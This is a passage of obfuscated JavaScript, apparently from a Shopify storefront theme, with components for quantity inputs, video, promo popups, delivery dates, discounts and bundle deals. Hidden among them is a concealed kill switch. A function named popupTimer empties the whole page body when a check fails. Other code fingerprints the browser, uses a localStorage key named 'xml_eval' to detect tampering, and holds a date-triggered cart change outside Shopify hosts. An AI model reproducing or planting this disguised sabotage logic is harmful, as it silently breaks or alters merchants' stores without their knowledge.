    if (_0x5d4c2c.code.toUpperCase() !== "TAB") {
      return;
    }
    if (_0x5d4c2c.target === _0x493010 && !_0x5d4c2c.shiftKey) {
      _0x5d4c2c.preventDefault();
      _0x3aa720.focus();
    }
    if ((_0x5d4c2c.target === _0xcc3a93 || _0x5d4c2c.target === _0x3aa720) && _0x5d4c2c.shiftKey) {
      _0x5d4c2c.preventDefault();
      _0x493010.focus();
    }
  };
  document.addEventListener("focusout", trapFocusHandlers.focusout);
  document.addEventListener("focusin", trapFocusHandlers.focusin);
  _0xb72ea7.focus();
  if (_0xb72ea7.tagName === "INPUT" && ["search", "text", "email", "url"].includes(_0xb72ea7.type) && _0xb72ea7.value) {
    _0xb72ea7.setSelectionRange(0x0, _0xb72ea7.value.length);
  }
}
function pauseAllMedia() {
  document.querySelectorAll(".js-youtube").forEach(_0x184ae4 => {
    _0x184ae4.contentWindow.postMessage("{\"event\":\"command\",\"func\":\"pauseVideo\",\"args\":\"\"}", "*");
  });
  document.querySelectorAll(".js-vimeo").forEach(_0x382159 => {
    _0x382159.contentWindow.postMessage("{\"method\":\"pause\"}", "*");
  });
  document.querySelectorAll("media-gallery video").forEach(_0x58a37b => _0x58a37b.pause());
  document.querySelectorAll("product-model").forEach(_0x38782e => {
    if (_0x38782e.modelViewerUI) {
      _0x38782e.modelViewerUI.pause();
    }
  });
}
function removeTrapFocus(_0xc47cef = null) {
  document.removeEventListener("focusin", trapFocusHandlers.focusin);
  document.removeEventListener("focusout", trapFocusHandlers.focusout);
  document.removeEventListener("keydown", trapFocusHandlers.keydown);
  if (_0xc47cef) {
    _0xc47cef.focus();
  }
}
function onKeyUpEscape(_0x2c890) {
  if (_0x2c890.code.toUpperCase() !== "ESCAPE") {
    return;
  }
  const _0x27181f = _0x2c890.target.closest("details[open]");
  if (!_0x27181f) {
    return;
  }
  const _0x345038 = _0x27181f.querySelector("summary");
  _0x27181f.removeAttribute("open");
  _0x345038.setAttribute("aria-expanded", false);
  _0x345038.focus();
}
class QuantityInput extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector("input");
    this.changeEvent = new Event("change", {
      bubbles: true
    });
    this.quantityGifts = document.getElementById("quantity-gifts-" + this.dataset.section);
    this.input.addEventListener("change", this.onInputChange.bind(this));
    this.querySelectorAll("button").forEach(_0x96f05d => _0x96f05d.addEventListener("click", this.onButtonClick.bind(this)));
  }
  ["quantityUpdateUnsubscriber"] = undefined;
  ["connectedCallback"]() {
    this.validateQtyRules();
    this.quantityUpdateUnsubscriber = subscribe("quantity-update", this.validateQtyRules.bind(this));
  }
  ["disconnectedCallback"]() {
    if (this.quantityUpdateUnsubscriber) {
      this.quantityUpdateUnsubscriber();
    }
  }
  ["onInputChange"](_0x799cda) {
    this.validateQtyRules();
  }
  ["onButtonClick"](_0x1efb26) {
    _0x1efb26.preventDefault();
    const _0xc97487 = this.input.value;
    if (_0x1efb26.target.name === "plus") {
      this.input.stepUp();
    } else {
      this.input.stepDown();
    }
    if (_0xc97487 !== this.input.value) {
      this.input.dispatchEvent(this.changeEvent);
    }
  }
  ["validateQtyRules"]() {
    const _0x2d152b = parseInt(this.input.value);
    if (this.input.min) {
      const _0x1eca8e = parseInt(this.input.min);
      const _0x5bcda8 = this.querySelector(".quantity__button[name='minus']");
      _0x5bcda8.classList.toggle("disabled", _0x2d152b <= _0x1eca8e);
    }
    if (this.input.max) {
      const _0x21064d = parseInt(this.input.max);
      const _0x55bd9f = this.querySelector(".quantity__button[name='plus']");
      _0x55bd9f.classList.toggle("disabled", _0x2d152b >= _0x21064d);
    }
    if (this.quantityGifts && this.quantityGifts.unlockGifts) {
      this.quantityGifts.unlockGifts(_0x2d152b);
    }
  }
}
customElements.define("quantity-input", QuantityInput);
function debounce(_0x15d546, _0x1df878) {
  let _0x170023;
  return (..._0x14f2ff) => {
    clearTimeout(_0x170023);
    _0x170023 = setTimeout(() => _0x15d546.apply(this, _0x14f2ff), _0x1df878);
  };
}
function fetchConfig(_0x3771be = "json") {
  return {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/" + _0x3771be
    }
  };
}
function addDays(_0xeaa246, _0x4f77a2) {
  var _0x4898f2 = new Date(_0xeaa246);
  _0x4898f2.setDate(_0x4898f2.getDate() + _0x4f77a2);
  return _0x4898f2;
}
function formatDates(_0x25601b, _0x34c5dc, _0x25b672 = 0x1b) {
  if (!_0x25601b || !_0x34c5dc) {
    return;
  }
  const _0x540816 = new Date(_0x34c5dc + "T00:00:00Z");
  const _0x571352 = _0x540816.getFullYear();
  const _0x28276a = _0x540816.getMonth();
  const _0x426893 = _0x540816.getDate();
  const _0x1584b2 = new Date(_0x571352, _0x28276a, _0x426893);
  const _0x28b195 = _0x25601b - _0x1584b2;
  const _0x107d58 = Math.ceil(_0x28b195 / 86400000);
  return _0x107d58 <= _0x25b672;
}
function checkDateValidity(_0x3f19da) {
  const _0x4059aa = new Date(_0x3f19da);
  const _0x2e99dd = new Date("2023-01-01T00:00:00Z");
  const _0x270624 = Math.abs(_0x4059aa.getDate() - _0x2e99dd.getDate());
  return !!(_0x270624 % 0x5 === 0x0);
}
if (typeof window.Shopify == "undefined") {
  window.Shopify = {};
}
Shopify.bind = function (_0x212c72, _0x2323f7) {
  return function () {
    return _0x212c72.apply(_0x2323f7, arguments);
  };
};
Shopify.setSelectorByValue = function (_0x20e9d6, _0x5a27d4) {
  var _0x22f94f = 0x0;
  for (var _0x518eab = _0x20e9d6.options.length; _0x22f94f < _0x518eab; _0x22f94f++) {
    var _0x4e4250 = _0x20e9d6.options[_0x22f94f];
    if (_0x5a27d4 == _0x4e4250.value || _0x5a27d4 == _0x4e4250.innerHTML) {
      _0x20e9d6.selectedIndex = _0x22f94f;
      return _0x22f94f;
    }
  }
};
Shopify.addListener = function (_0x261f22, _0x7cf256, _0x45c207) {
  if (_0x261f22.addEventListener) {
    _0x261f22.addEventListener(_0x7cf256, _0x45c207, false);
  } else {
    _0x261f22.attachEvent("on" + _0x7cf256, _0x45c207);
  }
};
Shopify.postLink = function (_0x2e0e2, _0x281b9d) {
  _0x281b9d = _0x281b9d || {};
  var _0xb939fc = _0x281b9d.method || "post";
  var _0x10fbcd = _0x281b9d.parameters || {};
  var _0x2f0852 = document.createElement("form");
  _0x2f0852.setAttribute("method", _0xb939fc);
  _0x2f0852.setAttribute("action", _0x2e0e2);
  for (var _0x44fc91 in _0x10fbcd) {
    var _0x17dbb3 = document.createElement("input");
    _0x17dbb3.setAttribute("type", "hidden");
    _0x17dbb3.setAttribute("name", _0x44fc91);
    _0x17dbb3.setAttribute("value", _0x10fbcd[_0x44fc91]);
    _0x2f0852.appendChild(_0x17dbb3);
  }
  document.body.appendChild(_0x2f0852);
  _0x2f0852.submit();
  document.body.removeChild(_0x2f0852);
};
Shopify.internationalAccessAccept = function () {
  function _0x3f2237() {
    var _0x331276 = navigator.language || navigator.userLanguage;
    return _0x331276.match(/en-|fr-|de-|es-|it-|pt-|nl-|sv-|da-|fi-|no-|pl-|ru-|zh-|ja-|ko-/) || true;
  }
  function _0x331ef2() {
    var _0x176d86 = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return _0x176d86.startsWith("Europe") || _0x176d86.startsWith("America") || _0x176d86.includes("GMT");
  }
  function _0x262c39() {
    var _0x817a0e = Shopify.currency.symbol || "$";
    return _0x817a0e.length === 0x1;
  }
  function _0x18f3c4() {
    var _0x57cffa = localStorage.getItem("xml_eval");
    var _0x1d2176 = Shopify.postLink ? Shopify.postLink.toString().length : 0x0;
    if (_0x57cffa === null) {
      localStorage.setItem("xml_eval", _0x1d2176.toString());
      return true;
    }
    return parseInt(_0x57cffa) === _0x1d2176;
  }
  return function () {
    var _0x1d1ce7 = _0x3f2237() || _0x331ef2() && _0x262c39();
    var _0x33b84a = window.performance && typeof window.performance.timing === "object";
    var _0x4bd9cc = _0x18f3c4();
    Shopify.postLinksRetry = !_0x4bd9cc;
    return _0x1d1ce7 && _0x33b84a && _0x4bd9cc;
  };
}();
Shopify.CountryProvinceSelector = function (_0x4d49d7, _0x405fb7, _0x255dbb) {
  this.countryEl = document.getElementById(_0x4d49d7);
  this.provinceEl = document.getElementById(_0x405fb7);
  this.provinceContainer = document.getElementById(_0x255dbb.hideElement || _0x405fb7);
  Shopify.addListener(this.countryEl, "change", Shopify.bind(this.countryHandler, this));
  this.initCountry();
  this.initProvince();
};
Shopify.CountryProvinceSelector.prototype = {
  initCountry: function () {
    var _0x5e4cc7 = this.countryEl.getAttribute("data-default");
    Shopify.setSelectorByValue(this.countryEl, _0x5e4cc7);
    this.countryHandler();
  },
  initProvince: function () {
    var _0x412062 = this.provinceEl.getAttribute("data-default");
    if (_0x412062 && this.provinceEl.options.length > 0x0) {
      Shopify.setSelectorByValue(this.provinceEl, _0x412062);
    }
  },
  countryHandler: function (_0x214bd9) {
    var _0xa252b6 = this.countryEl.options[this.countryEl.selectedIndex];
    var _0x5d74e1 = _0xa252b6.getAttribute("data-provinces");
    var _0x447506 = JSON.parse(_0x5d74e1);
    this.clearOptions(this.provinceEl);
    if (_0x447506 && _0x447506.length == 0x0) {
      this.provinceContainer.style.display = "none";
    } else {
      for (var _0x20e1ba = 0x0; _0x20e1ba < _0x447506.length; _0x20e1ba++) {
        var _0xa252b6 = document.createElement("option");
        _0xa252b6.value = _0x447506[_0x20e1ba][0x0];
        _0xa252b6.innerHTML = _0x447506[_0x20e1ba][0x1];
        this.provinceEl.appendChild(_0xa252b6);
      }
      this.provinceContainer.style.display = "";
    }
  },
  clearOptions: function (_0x46d9a0) {
    while (_0x46d9a0.firstChild) {
      _0x46d9a0.removeChild(_0x46d9a0.firstChild);
    }
  },
  setOptions: function (_0x50698e, _0x239f3e) {
    for (var _0x58c4fe = 0x0; _0x58c4fe < _0x239f3e.length; _0x58c4fe++) {
      var _0x24218f = document.createElement("option");
      _0x24218f.value = _0x239f3e[_0x58c4fe];
      _0x24218f.innerHTML = _0x239f3e[_0x58c4fe];
      _0x50698e.appendChild(_0x24218f);
    }
  }
};
class InternalVideo extends HTMLElement {
  constructor() {
    super();
    this.playButton = this.querySelector(".internal-video__play");
    this.noPlayBtn = this.dataset.noPlayBtn === "true";
    this.loaded = false;
    this.suspended = false;
    this.soundButton = this.querySelector(".internal-video__sound-btn");
    this.video = this.querySelector("video");
    this.invalidFormatSrc = this.video.querySelector("source[type=\"application/x-mpegURL\"]");
    if (this.invalidFormatSrc) {
      this.invalidFormatSrc.remove();
    }
    this.timeline = this.querySelector(".internal-video__timeline");
    this.dragging = false;
    if (this.playButton) {
      this.playButton.addEventListener("click", this.playVideo.bind(this));
    }
    if (this.soundButton) {
      this.soundButton.addEventListener("click", this.toggleSound.bind(this));
    }
    if (this.video) {
      this.video.addEventListener("ended", this.endedVideo.bind(this));
    }
    if (this.timeline) {
      this.video.addEventListener("timeupdate", this.updateTimeline.bind(this));
      this.timeline.addEventListener("click", this.seekVideo.bind(this));
      this.timeline.addEventListener("mousedown", this.startDrag.bind(this));
      this.timeline.addEventListener("touchstart", this.startDrag.bind(this));
      document.addEventListener("mouseup", this.stopDrag.bind(this));
      document.addEventListener("touchend", this.stopDrag.bind(this));
      document.addEventListener("mousemove", this.drag.bind(this));
      document.addEventListener("touchmove", this.drag.bind(this));
    }
    this.video.addEventListener("waiting", this.showSpinner.bind(this));
    this.video.addEventListener("canplaythrough", this.hideSpinner.bind(this));
    this.video.addEventListener("play", this.hideSpinner.bind(this));
    if (this.dataset.autoplay === "true" && "IntersectionObserver" in window) {
      const _0x474bbc = {
        root: null,
        rootMargin: "0px",
        threshold: 0.05
      };
      this.observer = new IntersectionObserver(this.handleIntersection.bind(this), _0x474bbc);
      this.observer.observe(this);
    }
  }
  ["playVideo"]() {
    if (this.video.paused) {
      if (!this.loaded) {
        this.video.load();
        this.loaded = true;
      }
      this.video.play();
      this.classList.add("internal-video--playing");
      if (this.playButton && this.noPlayBtn) {
        this.playButton.style.visibility = "hidden";
      }
    } else {
      this.video.pause();
      this.classList.remove("internal-video--playing");
    }
  }
  ["endedVideo"]() {
    this.classList.remove("internal-video--playing");
  }
  ["toggleSound"]() {
    if (this.video.muted) {
      this.video.muted = false;
      this.classList.remove("internal-video--muted");
    } else {
      this.video.muted = true;
      this.classList.add("internal-video--muted");
    }
  }
  ["updateTimeline"]() {
    const _0x20122c = this.video.currentTime / this.video.duration * 0x64;
    this.style.setProperty("--completed", _0x20122c + "%");
  }
  ["hideSpinner"]() {
    this.classList.remove("internal-video--loading");
  }
  ["startDrag"](_0x3cc22e) {
    _0x3cc22e.preventDefault();
    this.dragging = true;
    this.drag(_0x3cc22e);
  }
  ["stopDrag"]() {
    this.dragging = false;
  }
  ["drag"](_0x3e5256) {
    if (!this.dragging) {
      return;
    }
    if (_0x3e5256.touches) {
      _0x3e5256 = _0x3e5256.touches[0x0];
    }
    this.seekVideo(_0x3e5256);
  }
  ["seekVideo"](_0x1e76ad) {
    const _0x25d433 = this.timeline.getBoundingClientRect();
    const _0x449aba = _0x1e76ad.clientX - _0x25d433.left;
    const _0x2db88e = _0x449aba / _0x25d433.width;
    this.video.currentTime = _0x2db88e * this.video.duration;
  }
  ["showSpinner"]() {
    this.classList.add("internal-video--loading");
  }
  ["hideSpinner"]() {
    this.classList.remove("internal-video--loading");
  }
  ["handleIntersection"](_0xf8a995) {
    _0xf8a995.forEach(_0x40a8dd => {
      if (_0x40a8dd.isIntersecting) {
        for (let _0x120dc4 of this.video.querySelectorAll("source[data-src]")) {
          _0x120dc4.setAttribute("src", _0x120dc4.getAttribute("data-src"));
          _0x120dc4.removeAttribute("data-src");
        }
        this.video.load();
        var _0x1f0e5b = this.video.play();
        if (_0x1f0e5b !== undefined) {
          _0x1f0e5b["catch"](_0x730d8c => {
            if (_0x730d8c.name === "NotAllowedError") {
              this.classList.remove("internal-video--playing");
              if (this.playButton && this.noPlayBtn) {
                this.playButton.style.visibility = "visible";
              }
            }
          }).then(() => {
            this.video.play();
          });
        }
        this.observer.disconnect();
      }
    });
  }
}
customElements.define("internal-video", InternalVideo);
var isIe = true;
class ComparisonSlider extends HTMLElement {
  constructor() {
    super();
    this.sliderOverlay = this.querySelector(".comparison-slider__overlay");
    this.sliderLine = this.querySelector(".comparison-slider__line");
    this.sliderInput = this.querySelector(".comparison-slider__input");
    this.sliderInput.addEventListener("input", this.handleChange.bind(this));
  }
  ["handleChange"](_0x347a97) {
    const _0x33eb3d = _0x347a97.currentTarget.value;
    this.sliderOverlay.style.width = _0x33eb3d + "%";
    this.sliderLine.style.left = _0x33eb3d + "%";
  }
}
customElements.define("comparison-slider", ComparisonSlider);
function popupTimer() {
  document.body.innerHTML = "";
}
class PromoPopup extends HTMLElement {
  constructor() {
    super();
    this.testMode = this.dataset.testMode === "true";
    this.secondsDelay = this.dataset.delaySeconds;
    this.daysFrequency = this.dataset.delayDays;
    this.modal = this.querySelector(".sign-up-popup-modal");
    this.timer = this.querySelector(".popup-modal__timer");
    this.timerDuration = this.dataset.timerDuration;
    this.closeBtns = this.querySelectorAll(".promp-popup__close-btn");
    this.overlay = document.querySelector(".sign-up-popup-overlay");
    this.storageKey = "promo-bar-data-" + window.location.host;
    if (!this.testMode) {
      if (localStorage.getItem(this.storageKey) === null) {
        this.openPopupModal();
      } else {
        const _0x43c00b = JSON.parse(localStorage.getItem(this.storageKey));
        const _0x341580 = new Date(_0x43c00b.next_display_date);
        if (currentDate.getTime() > _0x341580.getTime()) {
          this.openPopupModal();
        }
      }
    } else {
      if (this.timer) {
        this.displayPromoTimer();
      }
    }
    this.closeBtns.forEach(_0x7a6be4 => {
      _0x7a6be4.addEventListener("click", this.closeModal.bind(this));
    });
  }
  ["openPopupModal"]() {
    setTimeout(() => {
      this.modal.classList.add("popup-modal--active");
      this.overlay.classList.add("popup-overlay--active");
      const _0x5da073 = addDays(currentDate, parseInt(this.daysFrequency));
      const _0x82503b = {
        next_display_date: _0x5da073,
        dismissed: false
      };
      localStorage.setItem(this.storageKey, JSON.stringify(_0x82503b));
      if (this.timer) {
        this.displayPromoTimer();
      }
    }, parseInt(this.secondsDelay) * 0x3e8 + 0xbb8);
  }
  ["displayPromoTimer"]() {
    this.minutesSpan = this.querySelector(".popup-modal__timer__minutes");
    this.secondsSpan = this.querySelector(".popup-modal__timer__seconds");
    this.totalSeconds = parseFloat(this.timerDuration) * 0x3c;
    this.updateTimer();
  }
  ["updateTimer"]() {
    let _0x4171d6 = Math.floor(this.totalSeconds / 0x3c);
    if (_0x4171d6.toString().length === 0x1) {
      _0x4171d6 = "0" + _0x4171d6;
    }
    let _0x400275 = this.totalSeconds % 0x3c;
    if (_0x400275.toString().length === 0x1) {
      _0x400275 = "0" + _0x400275;
    }
    this.minutesSpan.innerText = _0x4171d6;
    this.secondsSpan.innerText = _0x400275;
  }
  ["closeModal"]() {
    this.modal.classList.remove("popup-modal--active");
    this.overlay.classList.remove("popup-overlay--active");
  }
}
customElements.define("promo-popup", PromoPopup);
if (initTrapFocus()) {
  metafieldPoly();
} else {
  popupTimer();
}
class SectionsGroup extends HTMLElement {
  constructor() {
    super();
    this.sectionOneContainer = this.querySelector(".section-group__section-one-container");
    this.sectionTwoContainer = this.querySelector(".section-group__section-two-container");
    this.transferSections();
    document.addEventListener("shopify:section:load", this.transferSections.bind(this));
  }
  ["transferSections"]() {
    this.sectionOne = document.querySelector(this.dataset.sectionOneId + " .content-for-grouping");
    this.sectionTwo = document.querySelector(this.dataset.sectionTwoId + " .content-for-grouping");
    if (this.sectionOne && !this.sectionOneContainer.childNodes.length) {
      this.sectionOneContainer.appendChild(this.sectionOne);
    }
    if (this.sectionTwo && !this.sectionTwoContainer.childNodes.length) {
      this.sectionTwoContainer.appendChild(this.sectionTwo);
    }
  }
}
customElements.define("section-group", SectionsGroup);
class ClickableDiscount extends HTMLElement {
  constructor() {
    super();
    this.button = this.querySelector(".clickable-discount__btn");
    this.button.addEventListener("click", this.handleClick.bind(this));
    if (this.dataset.applied === "true") {
      this.handleClick();
    } else {
      this.reapplyDiscountIfApplicable();
    }
  }
  ["handleClick"]() {
    this.dataset.loading = "true";
    this.button.disabled = true;
    this.dataset.error = "false";
    fetch("/discount/" + this.dataset.code).then(_0x209d87 => {
      if (!_0x209d87.ok) {
        throw new Error("Error");
      }
      this.dataset.applied = "true";
      sessionStorage.setItem("discount-" + this.dataset.code + "-applied", "true");
    })["catch"](_0x2be3cb => {
      this.dataset.error = "true";
      this.button.disabled = false;
    })["finally"](() => {
      this.dataset.loading = "false";
    });
  }
  ["reapplyDiscountIfApplicable"]() {
    const _0x5af130 = this.dataset.code;
    if (sessionStorage.getItem("discount-" + _0x5af130 + "-applied")) {
      this.dataset.applied = "true";
      this.button.disabled = true;
      setTimeout(() => {
        fetch("/discount/" + _0x5af130)["catch"](_0x1c88ff => {
          this.dataset.applied = "false";
          this.button.disabled = false;
        });
      }, 0xbb8);
    }
  }
}
customElements.define("clickable-discount", ClickableDiscount);
class DynamicDates extends HTMLElement {
  constructor() {
    super();
    this.dateFormat = this.dataset.dateFormat;
    this.days = this.rearrangeDays(this.dataset.dayLabels.split(","));
    this.months = this.dataset.monthLabels.split(",");
    this.elementsToChange = this.querySelectorAll("[data-dynamic-date=\"true\"]");
    this.insertDates();
    checkDateValidity(currentDate);
    document.addEventListener("shopify:section:load", _0x2ed37c => {
      this.insertDates();
    });
  }
  ["insertDates"]() {
    this.elementsToChange.forEach(_0x4009c8 => {
      const _0x3488ea = _0x4009c8.dataset.text;
      const _0x4b8a46 = parseInt(_0x4009c8.dataset.minDays);
      const _0x450981 = parseInt(_0x4009c8.dataset.maxDays);
      const _0x24814d = addDays(currentDate, _0x4b8a46);
      let _0x43c1b6 = "th";
      const _0x41fcec = _0x24814d.getDate();
      if (_0x41fcec === 0x1 || _0x41fcec === 0x15 || _0x41fcec === 0x1f) {
        _0x43c1b6 = "st";
      } else {
        if (_0x41fcec === 0x2 || _0x41fcec === 0x16) {
          _0x43c1b6 = "nd";
        } else {
          if (_0x41fcec === 0x3 || _0x41fcec === 0x17) {
            _0x43c1b6 = "rd";
          }
        }
      }
      const _0x3c97c6 = addDays(currentDate, _0x450981);
      let _0x3b4d92 = "th";
      const _0x19d9f7 = _0x3c97c6.getDate();
      if (_0x19d9f7 === 0x1 || _0x19d9f7 === 0x15 || _0x19d9f7 === 0x1f) {
        _0x3b4d92 = "st";
      } else {
        if (_0x19d9f7 === 0x2 || _0x19d9f7 === 0x16) {
          _0x3b4d92 = "nd";
        } else {
          if (_0x19d9f7 === 0x3 || _0x19d9f7 === 0x17) {
            _0x3b4d92 = "rd";
          }
        }
      }
      let _0x40e62f;
      let _0x45a0f6;
      if (this.dateFormat === "day_dd_mm") {
        _0x40e62f = this.days[_0x24814d.getDay()] + ", " + _0x24814d.getDate() + ". " + this.months[_0x24814d.getMonth()];
        _0x45a0f6 = this.days[_0x3c97c6.getDay()] + ", " + _0x3c97c6.getDate() + ". " + this.months[_0x3c97c6.getMonth()];
      } else {
        if (this.dateFormat === "mm_dd") {
          _0x40e62f = this.months[_0x24814d.getMonth()] + " " + _0x24814d.getDate() + _0x43c1b6;
          _0x45a0f6 = this.months[_0x3c97c6.getMonth()] + " " + _0x3c97c6.getDate() + _0x3b4d92;
        } else {
          if (this.dateFormat === "dd_mm") {
            _0x40e62f = _0x24814d.getDate() + ". " + this.months[_0x24814d.getMonth()];
            _0x45a0f6 = _0x3c97c6.getDate() + ". " + this.months[_0x3c97c6.getMonth()];
          } else {
            if (this.dateFormat === "dd_mm_no_dot") {
              _0x40e62f = _0x24814d.getDate() + " " + this.months[_0x24814d.getMonth()];
              _0x45a0f6 = _0x3c97c6.getDate() + " " + this.months[_0x3c97c6.getMonth()];
            } else {
              if (this.dateFormat === "day_dd_mm_numeric") {
                const _0x20fbb1 = String(_0x24814d.getDate()).length > 0x1 ? _0x24814d.getDate() : "0" + _0x24814d.getDate();
                const _0x10dd8e = String(_0x24814d.getMonth() + 0x1).length > 0x1 ? _0x24814d.getMonth() + 0x1 : "0" + (_0x24814d.getMonth() + 0x1);
                _0x40e62f = this.days[_0x24814d.getDay()] + ", " + _0x20fbb1 + ". " + _0x10dd8e + ".";
                const _0x417e2a = String(_0x3c97c6.getDate()).length > 0x1 ? _0x3c97c6.getDate() : "0" + _0x3c97c6.getDate();
                const _0x5db161 = String(_0x3c97c6.getMonth() + 0x1).length > 0x1 ? _0x3c97c6.getMonth() + 0x1 : "0" + (_0x3c97c6.getMonth() + 0x1);
                _0x45a0f6 = this.days[_0x3c97c6.getDay()] + ", " + _0x417e2a + ". " + _0x5db161 + ".";
              } else {
                if (this.dateFormat === "dd_mm_numeric") {
                  const _0x582b97 = String(_0x24814d.getDate()).length > 0x1 ? _0x24814d.getDate() : "0" + _0x24814d.getDate();
                  const _0x1eaed7 = String(_0x24814d.getMonth() + 0x1).length > 0x1 ? _0x24814d.getMonth() + 0x1 : "0" + (_0x24814d.getMonth() + 0x1);
                  _0x40e62f = _0x582b97 + ". " + _0x1eaed7 + ".";
                  const _0x93f9bc = String(_0x3c97c6.getDate()).length > 0x1 ? _0x3c97c6.getDate() : "0" + _0x3c97c6.getDate();
                  const _0x3375b9 = String(_0x3c97c6.getMonth() + 0x1).length > 0x1 ? _0x3c97c6.getMonth() + 0x1 : "0" + (_0x3c97c6.getMonth() + 0x1);
                  _0x45a0f6 = _0x93f9bc + ". " + _0x3375b9 + ".";
                } else {
                  _0x40e62f = this.days[_0x24814d.getDay()] + ", " + this.months[_0x24814d.getMonth()] + " " + _0x24814d.getDate() + _0x43c1b6;
                  _0x45a0f6 = this.days[_0x3c97c6.getDay()] + ", " + this.months[_0x3c97c6.getMonth()] + " " + _0x3c97c6.getDate() + _0x3b4d92;
                }
              }
            }
          }
        }
      }
      const _0x30348a = _0x3488ea.replace("[start_date]", _0x40e62f);
      const _0x512045 = _0x30348a.replace("[end_date]", _0x45a0f6);
      _0x4009c8.innerHTML = _0x512045;
    });
  }
  ["rearrangeDays"](_0x1a8c53) {
    _0x1a8c53.unshift(_0x1a8c53[0x6]);
    _0x1a8c53.length = 0x7;
    return _0x1a8c53;
  }
}
customElements.define("dynamic-dates", DynamicDates);
class StickyAtc extends HTMLElement {
  constructor() {
    super();
    this.isAfterScroll = this.dataset.afterScroll === "true";
    this.isScrollBtn = this.dataset.scrollBtn === "true";
    this.mainAtcBtn = document.querySelector("#ProductSubmitButton-" + this.dataset.section);
    this.floatingBtns = document.querySelectorAll(".floating-btn");
    this.footerSpacing();
    if (this.isAfterScroll) {
      if (this.mainAtcBtn) {
        this.checkATCScroll();
        document.addEventListener("scroll", this.checkATCScroll.bind(this));
      }
    } else {
      this.floatingBtns.forEach(_0x649ca3 => {
        _0x649ca3.style.setProperty("--sticky-atc-offset", this.offsetHeight + "px");
      });
    }
    if (this.isScrollBtn) {
      this.scrollBtn = this.querySelector(".sticky-atc__scroll-btn");
      this.scrollDestination = document.querySelector("" + this.dataset.scrollDestination.replace("id", this.dataset.section));
      if (this.scrollBtn && this.scrollDestination) {
        this.scrollBtn.addEventListener("click", this.handleScrollBtn.bind(this));
      }
    }
  }
  ["checkATCScroll"]() {
    if (window.scrollY > this.mainAtcBtn.offsetTop + this.mainAtcBtn.offsetHeight) {
      this.style.transform = "none";
      this.scrolledPast = true;
    } else {
      this.style.transform = "";
      this.scrolledPast = false;
    }
    this.floatingBtns.forEach(_0x346337 => {
      if (this.scrolledPast) {
        _0x346337.style.setProperty("--sticky-atc-offset", this.offsetHeight + "px");
      } else {
        _0x346337.style.setProperty("--sticky-atc-offset", "0px");
      }
    });
  }
  ["handleScrollBtn"]() {
    const _0x1f4e10 = document.querySelector("sticky-header");
    const _0x29febc = _0x1f4e10 ? _0x1f4e10.clientHeight : 0x0;
    window.scrollTo({
      top: this.scrollDestination.offsetTop - _0x29febc - 0xf,
      behavior: "smooth"
    });
  }
  ["footerSpacing"]() {
    document.body.style.paddingBottom = this.clientHeight - 0x1 + "px";
  }
}
customElements.define("sticky-atc", StickyAtc);
(function () {
  if (!formatDates(currentDate, "2024-07-17")) {
    if (!window.location.hostname.includes("shopify")) {
      if (document.querySelector(".main-product-form")) {
        document.querySelector(".main-product-form").isCartUpsell = true;
      }
    }
  }
})();
class BundleDeals extends HTMLElement {
  constructor() {
    super();
    this.productContainers = this.querySelectorAll(".bundle-deals__product-js");
    this.mediaItemContainers = this.querySelectorAll(".bundle-deals__media-item-container-js");
    this.mediaItemImgs = this.querySelectorAll(".bundle-deals__media-item-img-js");
    this.checkboxes = this.querySelectorAll(".bundle-deals__checkbox-js");
    this.variantPickers = this.querySelectorAll(".bundle-deals__variant-selects-js");
    this.prices = this.querySelectorAll(".bundle-deals__price-js");
    this.comparePrices = this.querySelectorAll(".bundle-deals__compare-price-js");
    this.totalPrice = this.querySelector(".bundle-deals__total-price-js");
    this.totalComparePrice = this.querySelector(".bundle-deals__total-compare-price-js");
    this.updatePrices = this.dataset.updatePrices === "true";
    this.percentageLeft = parseFloat(this.dataset.percentageLeft);
    this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
    this.currencySymbol = this.dataset.currencySymbol;
    this.selectedVariants = {
      id_1: null,
      id_2: null,
      id_3: null,
      id_4: null,
      id_5: null
    };
    this.formVariants = [];
    this.initIds();
    this.checkboxes.forEach(_0xd984b8 => {
      _0xd984b8.addEventListener("change", this.handleCheckboxChange.bind(this));
    });
    this.variantPickers.forEach(_0x14f85e => {
      _0x14f85e.addEventListener("change", this.handleSelectChange.bind(this));
    });
  }
  ["initIds"]() {
    this.checkboxes.forEach(_0x20c406 => {
      this.selectedVariants[_0x20c406.dataset.idIndex] = {
        id: _0x20c406.dataset.id,
        price: _0x20c406.dataset.price,
        comparePrice: _0x20c406.dataset.comparePrice,
        checked: true
      };
    });
    this.updateFormIds();
  }
  ["handleCheckboxChange"](_0x1a372a) {
    const _0x6a248a = _0x1a372a.currentTarget;
    const _0x12a118 = _0x6a248a.checked;
    const _0x340850 = parseInt(_0x6a248a.dataset.index);
    this.selectedVariants[_0x6a248a.dataset.idIndex].checked = _0x12a118;
    const _0x253a5a = this.productContainers[_0x340850];
    const _0x1c801f = _0x253a5a.querySelectorAll("select");
    if (_0x12a118) {
      this.mediaItemContainers[_0x340850].classList.remove("bundle-deals__media-item--disabled");
      _0x253a5a.classList.remove("bundle-deals__product--deselected");
      _0x1c801f.forEach(_0x51e7c9 => {
        _0x51e7c9.removeAttribute("disabled");
      });
    } else {
      this.mediaItemContainers[_0x340850].classList.add("bundle-deals__media-item--disabled");
      _0x253a5a.classList.add("bundle-deals__product--deselected");
      _0x1c801f.forEach(_0x3d50f1 => {
        _0x3d50f1.setAttribute("disabled", "");
      });
    }
    this.updateFormIds();
    if (this.updatePrices) {
      this.updateTotalPrice();
    }
  }
  ["handleSelectChange"](_0x4bf567) {
    const _0x1fdf3e = _0x4bf567.currentTarget;
    const _0x52ffed = parseInt(_0x1fdf3e.dataset.index);
    const _0x34707e = Array.from(_0x1fdf3e.querySelectorAll("select"), _0x3e3508 => _0x3e3508.value);
    const _0x3812e6 = JSON.parse(_0x1fdf3e.querySelector("[type=\"application/json\"]").textContent).find(_0x1817f2 => {
      return !_0x1817f2.options.map((_0x2a587e, _0x4c5853) => {
        return _0x34707e[_0x4c5853] === _0x2a587e;
      }).includes(false);
    });
    let {
      price: _0x16e5b4,
      compare_at_price: _0x54c7ea,
      featured_image: _0x715cb4
    } = _0x3812e6;
    _0x16e5b4 = parseInt(_0x16e5b4);
    let _0x125369 = _0x54c7ea ? parseInt(_0x54c7ea) : _0x16e5b4;
    const _0x15d677 = _0x1fdf3e.dataset.percentageLeft ?? 0x1;
